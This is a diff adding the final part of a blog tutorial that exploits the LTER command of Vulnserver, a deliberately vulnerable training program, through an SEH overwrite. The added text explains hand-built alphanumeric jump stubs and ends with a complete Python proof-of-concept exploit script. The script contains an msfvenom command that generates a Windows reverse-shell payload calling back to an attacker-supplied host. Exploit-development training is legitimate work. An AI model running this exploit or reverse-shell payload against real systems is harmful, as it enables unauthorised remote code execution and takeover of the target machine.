@@ -93,3 +93,90 @@ This jump help us to create more space so that we can make a further jump to our
 The second jump looks like this.
 
 <img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-9.png"/>
+
+For the second jump, we are going to jump to the very beginning of our payload. To do so, we will use ebx as a reference. Since ebx is storing the original ESP location, we can calculate the distance between and add up the values. Since it is 0x588 away, we will use eax to perform the calculation and push it to esi. After that, all we need it just a jump esi and we can execute our shellcode. Then we will align ESP so that we can push our jump esi to the stack.
+
+<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-10.png"/>
+
+Now, with the second jump, we have over 3000 bytes of space to use and all we need is our encoded shellcode. Since, even x86/alpha_mixed cannot eliminate all bad character, we will use BufferRegister=ECX to state that the shellcode start at the absolute address of ECX. I did try with ESP but it just doesn't work. Before, I execute the shellcode, I also restore the original ESP address that we stored in EBX to avoid any error during the reverse shell with a push EBX and pop ESP. That's the reason why I will add eax by 2 bytes to push it to ECX, cause the shellcode need to reference the begin at where ECX is pointing at. 
+
+<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-11.png"/>
+
+The shellcode is pointing at our reverse shell shellcode and if we hit run, we will get our reverse shell!!
+
+<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-12.png"/>
+
+And the final POC
+```python
+#!/usr/bin/python
+import socket
+import sys
+
+#6250120B pop pop retn
+#msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/alpha_mixed -b '\x00\x0A\x0D' BufferRegister=ECX -f c 
+
+jump = ("\x60\x54\x58\x54\x5B\x66\x05\x79\x13"
+"\x50\x5C\x25\x41\x41\x41\x41\x25\x3E"
+"\x3E\x3E\x3E\x05\x41\x41\x41\x41\x66"
+"\x05\x41\x41\x66\x05\x69\x03\x50")
+#00000000  60                pusha
+#00000001  54                push esp
+#00000002  58                pop eax
+#00000003  54                push esp
+#00000004  5B                pop ebx
+#00000005  66057913          add ax,0x1379
+#00000009  50                push eax
+#0000000A  5C                pop esp
+#0000000B  2541414141        and eax,0x41414141
+#00000010  253E3E3E3E        and eax,0x3e3e3e3e
+#00000015  0541414141        add eax,0x41414141
+#0000001A  66054141          add ax,0x4141
+#0000001E  66056903          add ax,0x369
+#00000022  50                push eax = 0x85EB4141
+
+jump2 = ("\x53\x58\x66\x05\x62\x01\x66\x05\x62\x01"
+"\x66\x05\x62\x01\x66\x05\x62\x01\x50\x5F"
+"\x04\x02\x50\x59\x66\x05\x77\x07\x66\x05"
+"\x41\x06\x50\x5C\x25\x41\x41\x41\x41\x25"
+"\x3E\x3E\x3E\x3E\x05\x41\x41\x41\x41\x66"
+"\x05\x41\x41\x66\x05\x7D\x65\x50")
+#00000000  53                push ebx
+#00000001  58                pop eax
+#00000002  66056201          add ax,0x162
+#00000006  66056201          add ax,0x162
+#0000000A  66056201          add ax,0x162
+#0000000E  66056201          add ax,0x162
+#00000012  50                push eax
+#00000013  5F                pop edi
+#00000014  0402              add al,0x2
+#00000016  50                push eax
+#00000017  59                pop ecx
+#00000018  66057707          add ax,0x777
+#0000001C  66054106          add ax,0x641
+#00000020  50                push eax
+#00000021  5C                pop esp
+#00000022  2541414141        and eax,0x41414141
+#00000027  253E3E3E3E        and eax,0x3e3e3e3e
+#0000002C  0541414141        add eax,0x41414141
+#00000031  66054141          add ax,0x4141
+#00000035  66057D65          add ax,0x657d
+#00000039  50                push eax = 0xE7FF4141
+
+shellcode = ("Shellcode here")
+RHOST = '192.168.170.129'
+RPORT = 9999
+length = 5000
+string = "LTER /.:/" + "\x46" * 3
+string += "\x53\x5C" + shellcode + "\x46" * (3515-3-2-64-len(shellcode))
+string += jump2
+string += "\x46" * (64-len(jump2))
+string +="\x42\x42\x77\x04" 
+string +="\x0B\x12\x50\x62"
+string += jump
+string += "\x46" *(length - len(string))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((RHOST,RPORT))
+s.recv(1024)
+s.send(string)
+s.close()
+```
